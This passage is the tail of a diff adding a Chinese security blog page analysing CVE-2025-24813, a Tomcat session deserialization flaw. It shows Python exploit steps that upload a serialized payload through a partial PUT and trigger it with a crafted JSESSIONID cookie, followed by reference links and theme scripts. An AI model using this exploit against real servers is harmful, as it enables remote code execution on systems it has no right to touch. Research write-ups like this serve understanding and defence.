+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;ser.bin&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 上传</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>put(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.session&#39;</span>, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Content-Range&#34;</span> : <span style="color:#e6db74">&#34;bytes 0-</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/5000&#34;</span><span style="color:#f92672">.</span>format(len(payload) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)}, data<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 触发Session反序列化</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/index.jsp&#39;</span>, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;JSESSIONID&#34;</span> : <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> filename})
+</span></span></code></pre></div><p>这里需要自己在<code>webapps/ROOT</code>下写一个<code>index.jsp</code>，不然会报404，不会触发Session反序列化。</p>
+<h1 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="https://boogipop.com/2025/03/13/CVE-2025-24813%20Tomcat%20Session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3/">https://boogipop.com/2025/03/13/CVE-2025-24813%20Tomcat%20Session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3/</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e">https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e</a></p>
+<p><a href="https://whoamianony.top/posts/apache-tomcat-rce-via-write-enabled-default-servlet/">https://whoamianony.top/posts/apache-tomcat-rce-via-write-enabled-default-servlet/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
